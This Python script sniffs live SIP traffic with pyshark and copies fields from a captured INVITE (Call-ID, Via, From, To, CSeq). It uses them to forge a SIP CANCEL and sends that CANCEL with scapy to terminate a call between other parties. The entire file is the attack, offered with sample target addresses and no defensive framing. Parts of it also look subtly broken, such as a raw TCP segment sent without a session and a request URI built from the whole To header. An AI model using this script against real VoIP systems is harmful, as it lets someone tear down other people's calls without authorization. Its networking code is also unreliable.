import pyshark
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.sip import SIP, SIPRequest


def extract_sip_info(interface, ip, port):
    # Capture live traffic from the specified interface
    cap = pyshark.LiveCapture(
        interface=interface,
        display_filter=f"sip && ip.src=={ip} && tcp.port=={port}",
    )

    invite_info = {}

    # Iterate over the packets to find the INVITE message
    for packet in cap.sniff_continuously():
        if "sip" in packet:
            sip_layer = packet.sip
            print(sip_layer.field_names)
            if (
                sip_layer.has_field("cseq_method")
                and sip_layer.cseq_method == "INVITE"
            ):
                invite_info["call_id"] = sip_layer.get_field_value("call_id")
                invite_info["via"] = sip_layer.get_field_value("via")
                invite_info["from"] = sip_layer.get_field_value("from")
                invite_info["to"] = sip_layer.get_field_value("to")
                invite_info["cseq"] = sip_layer.get_field_value("cseq")
                break  # Once INVITE is found, we stop

    cap.close()
    return invite_info


def craft_cancel_message(invite_info):
    if not invite_info:
        print("No INVITE information found.")
        return None

    cancel_message = (
        f"CANCEL sip:{invite_info['to']} SIP/2.0\r\n"
        f"Via: {invite_info['via']}\r\n"
        f"From: {invite_info['from']}\r\n"
        f"To: {invite_info['to']}\r\n"
        f"Call-ID: {invite_info['call_id']}\r\n"
        f"CSeq: {invite_info['cseq'].split(' ')[0]} CANCEL\r\n"
        f"Content-Length: 0\r\n\r\n"
    )
    return cancel_message


def send_cancel_message(cancel_message, dst_ip, dst_port):
    if not cancel_message:
        print("No CANCEL message to send.")
        return

    ip_layer = IP(dst=dst_ip)
    tcp_layer = TCP(dport=dst_port)
    sip_layer = SIP(cancel_message)

    packet = ip_layer / tcp_layer / sip_layer
    send(packet)
    print("CANCEL message sent.")


# Example usage
interface = "any"  # e.g., 'eth0' or 'en0'
source_ip = "10.213.57.101"
source_port = "5060"
destination_ip = "10.213.57.102"
destination_port = "5060"

invite_info = extract_sip_info(interface, source_ip, source_port)
cancel_message = craft_cancel_message(invite_info)
send_cancel_message(cancel_message, destination_ip, destination_port)
